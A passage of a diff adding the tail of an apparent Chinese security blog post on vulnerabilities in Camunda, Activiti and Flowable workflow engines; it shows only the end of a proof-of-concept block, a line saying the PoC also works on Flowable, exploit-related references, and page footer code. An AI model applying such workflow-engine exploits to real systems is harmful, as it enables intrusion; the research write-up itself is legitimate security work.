class="name">definitions</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该 poc 同样适用于 flowable。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.camunda.org/get-started/">https://docs.camunda.org/get-started/</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.camunda.org/rest/camunda-bpm-platform/7.23-SNAPSHOT/#tag/Deployment/operation/createDeployment">https://docs.camunda.org/rest/camunda-bpm-platform/7.23-SNAPSHOT/#tag/Deployment/operation/createDeployment</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.camunda.org/manual/develop/user-guide/process-engine/securing-custom-code/">https://docs.camunda.org/manual/develop/user-guide/process-engine/securing-custom-code/</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.camunda.org/manual/latest/user-guide/process-engine/expression-language/">https://docs.camunda.org/manual/latest/user-guide/process-engine/expression-language/</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.camunda.org/manual/latest/user-guide/dmn-engine/expressions-and-scripts/">https://docs.camunda.org/manual/latest/user-guide/dmn-engine/expressions-and-scripts/</a></li>
+<li><a target="_blank" rel="noopener" href="https://camunda.github.io/feel-scala/docs/developer-guide/bootstrappin">https://camunda.github.io/feel-scala/docs/developer-guide/bootstrappin</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html">https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/3823">https://forum.butian.net/share/3823</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.omg.org/spec/BPMN/2.0.2/PDF">https://www.omg.org/spec/BPMN/2.0.2/PDF</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#camunda"><span class="toc-number">2.</span> <span class="toc-text">camunda</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#activiti"><span class="toc-number">3.</span> <span class="toc-text">activiti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">4.</span> <span class="toc-text">reference</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&text=workflow 相关组件漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&is_video=false&description=workflow 相关组件漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=workflow 相关组件漏洞&body=Check out this article: http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&title=workflow 相关组件漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&name=workflow 相关组件漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/&t=workflow 相关组件漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    wude
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
